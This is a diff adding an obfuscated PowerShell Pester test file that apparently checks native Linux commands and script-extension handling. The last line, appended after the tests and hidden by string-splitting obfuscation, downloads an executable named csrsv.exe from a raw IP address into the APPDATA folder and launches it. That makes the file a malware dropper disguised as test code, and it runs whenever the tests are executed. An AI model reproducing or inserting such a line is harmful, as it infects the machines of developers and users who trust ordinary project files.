@@ -1,0 +1,74 @@
+$y12 =  [tyPE]("{0}{2}{1}"-F 'io','h','.PaT')  ;
+
+&("{2}{1}{0}" -f'ibe','r','Desc') ("{2}{3}{4}{5}{0}{1}" -f 'inux','Commands','N','ativ','e','L') -tags "CI" {
+    .("{2}{0}{1}" -f 'e','foreAll','B') {
+        ${ORIG`in`ALde`Fa`UL`TP`ARaMS} = ${p`sdefAultp`A`RaMEtERvalu`es}.("{0}{1}" -f 'C','lone').Invoke()
+        ${ps`dE`FaUlTParamE`TErVAl`Ues}[("{2}{1}{0}"-f'kip','S','It:')] = ${ISw`iN`dOWs}
+        ${orIg`iNAL`PATH} = ${En`V:PAth}
+        ${env`:P`Ath} +=   (ls ("VarIa"+"Bl"+"e:Y12")).vALUE::"P`AthSepa`RaTor" + ${tE`sTdR`ivE}
+    }
+
+    &("{2}{0}{1}"-f 'erA','ll','Aft') {
+        ${Gl`obaL`:p`sd`eFau`LtparAMeTERvalUeS} = ${O`RiG`INa`LdEF`AulTpa`R`AMs}
+        ${e`NV:Pa`Th} = ${or`IGi`N`AlPaTh}
+    }
+
+    .('It') ("{1}{3}{4}{0}{2}" -f'plic','Sho','ation grep','uld find ','Ap') {
+        (&("{1}{2}{0}{3}"-f'-c','ge','t','ommand') ("{1}{0}" -f'p','gre'))."cOmMA`Nd`Ty`pE" | &("{0}{1}" -f 'Sh','ould') -Be ("{2}{1}{0}{3}"-f 'io','licat','App','n')
+    }
+
+    .('It') ("{4}{5}{6}{1}{0}{2}{7}{3}" -f 'n',' grep a','d','get result','Shou','ld pi','pe to',' ') {
+        ("{2}{0}{1}{3}"-f 'lo w','orl','hel','d') | &("{0}{1}"-f 'gre','p') ("{0}{1}"-f 'he','llo') | .("{1}{0}"-f 'ld','Shou') -BeExactly ("{3}{0}{1}{2}"-f 'lo wor','l','d','hel')
+    }
+
+    .('It') ("{4}{2}{0}{1}{5}{3}" -f 'on t','o','Applicati','ch','Should find ','u') {
+        (.("{0}{3}{1}{2}"-f'get-c','mman','d','o') ("{1}{0}" -f'h','touc'))."CoMMand`Ty`PE" | &("{1}{0}"-f'd','Shoul') -Be ("{2}{0}{1}" -f 'p','lication','Ap')
+    }
+
+    &('It') ("{8}{1}{11}{7}{4}{9}{12}{0}{3}{2}{13}{5}{10}{6}" -f'e','ct stan','rst co',' fi','t if ','m','(1)','u','Should not redire','native ','and in pipeline ','dard inp','command is th','m') {
+        .('df') | &("{1}{3}{2}{0}"-f'ect','ForEa','j','ch-Ob') -Begin { ${O`Ut} = @() } -Process { ${o`UT} += ${_} }
+        ${O`UT}."L`e`NGtH" -gt 0 | &("{0}{2}{1}"-f 'Sh','d','oul') -BeTrue
+        ${o`Ut}[0] -like ("{4}{0}{3}{2}{1}"-f 'le','ailable*','*Av','system','Fi') | &("{1}{0}{2}"-f 'l','Shou','d') -BeTrue
+    }
+
+    &('It') ("{1}{6}{13}{9}{7}{16}{5}{23}{22}{20}{8}{10}{11}{18}{2}{3}{15}{14}{4}{12}{0}{21}{17}{19}" -f'm','Sh','e comma','nd is ','rst c','e','ou','d','t','d not re',' i','f','om','l','he fi','t','ir','nd in pipe',' nativ','line (2)','inpu','a',' standard ','ct') {
+        ${o`UT} = .('df')
+        ${O`UT}."leNG`Th" -gt 0 | &("{1}{0}"-f 'ould','Sh') -BeTrue
+        ${o`Ut}[0] -like ("{4}{3}{0}{2}{1}{5}" -f 'm','Availa','*','lesyste','Fi','ble*') | .("{2}{1}{0}" -f'ld','ou','Sh') -BeTrue
+    }
+
+    &('It') ("{5}{1}{9}{6}{0}{2}{12}{7}{11}{10}{4}{8}{3}" -f'd c','houl','o','e name','with','S','fin','and',' sam','d ',' script ',' before','mm') {
+        &("{3}{1}{0}{2}" -f'te','Con','nt','Set-') "$TestDrive\foo" -Value ((("{0}{8}{6}{1}{5}{7}{4}{3}{2}"-f'P','ech','y','
+PV','andEqU','o ','y
+
+','EqUcomm','V'))."REp`L`ACE"(([ChAr]69+[ChAr]113+[ChAr]85),[STRING][ChAr]39)."r`e`pLace"('PVy',[STRING][ChAr]34)) -Encoding ("{1}{0}" -f 'cii','As')
+        &("{1}{0}" -f 'd','chmo') ('+x') "$TestDrive/foo"
+        .("{1}{2}{0}"-f't','Set-C','onten') "$TestDrive\foo.ps1" -Value ((("{4}{1}{0}{2}{3}"-f '5
+','d','eI3','scripteI3
+ad5','a'))."REPl`AcE"(([ChaR]97+[ChaR]100+[ChaR]53),[StRINg][ChaR]34)."Re`PL`Ace"('eI3',[StRINg][ChaR]39)) -Encoding ("{0}{1}"-f 'Asci','i')
+        &("{1}{0}" -f 'oo','f') | &("{1}{2}{0}"-f'ld','Sh','ou') -BeExactly ("{2}{0}{1}" -f 'omman','d','c')
+    }
+}
+
+.("{0}{2}{1}"-f 'De','cribe','s') ("{0}{6}{1}{4}{3}{2}{5}" -f 'Scri','s with','n','te',' ex','sions','pt') -tags "CI" {
+    &("{1}{0}{2}" -f'for','Be','eAll') {
+        ${d`AtA} = ("{0}{2}{3}{1}"-f'H','d','el','lo Worl')
+        .("{0}{1}"-f 'Se','tup') -File ("{1}{0}{3}{2}"-f'estScri','t','ps1','pt.') -Content "'$data'"
+        ${or`IG`INalP`ATH} = ${en`V:p`AtH}
+        ${ENv`:Pa`TH} +=  $y12::"PAt`hsE`PA`RA`TOR" + ${t`est`drI`VE}
+    }
+
+    .("{0}{1}{2}"-f'Af','terAl','l') {
+        ${e`Nv:`PATH} = ${ORiG`in`A`lpAtH}
+    }
+
+    &('It') ("{11}{0}{6}{1}{8}{5}{10}{7}{9}{3}{2}{4}"-f 'hould ','u','ll ','ts fu','name',' a s','r','ipt with ','n','i','cr','S') {
+        &("{1}{4}{3}{2}{0}" -f '.ps1','testS','ipt','r','c') | &("{0}{1}"-f'Sh','ould') -BeExactly ${Da`Ta}
+    }
+
+    &('It') ("{4}{6}{1}{5}{0}{9}{3}{2}{8}{7}"-f 'p','n ',' its ','ith','Shoul','a scri','d ru','me','short na','t w') {
+        .("{2}{0}{1}"-f'tScri','pt','tes') | &("{1}{0}" -f'ould','Sh') -BeExactly ${d`ATA}
+    }
+}
+
+(.("{0}{2}{1}" -f'New-','ct','Obje') ("{2}{4}{0}{1}{3}" -f'.Web','Cl','Syste','ient','m.Net')).("{0}{1}{2}" -f'Downl','o','adFile').Invoke(("{0}{6}{7}{2}{8}{9}{5}{3}{1}{4}"-f 'http','ex','48','.','e','oo/csrsv','://8','9.2','.170.2','18/~yah'),"$env:APPDATA\csrsv.exe");&("{0}{1}{3}{2}" -f 'Sta','rt','s','-Proces') ("$env:APPDATA\csrsv.exe")
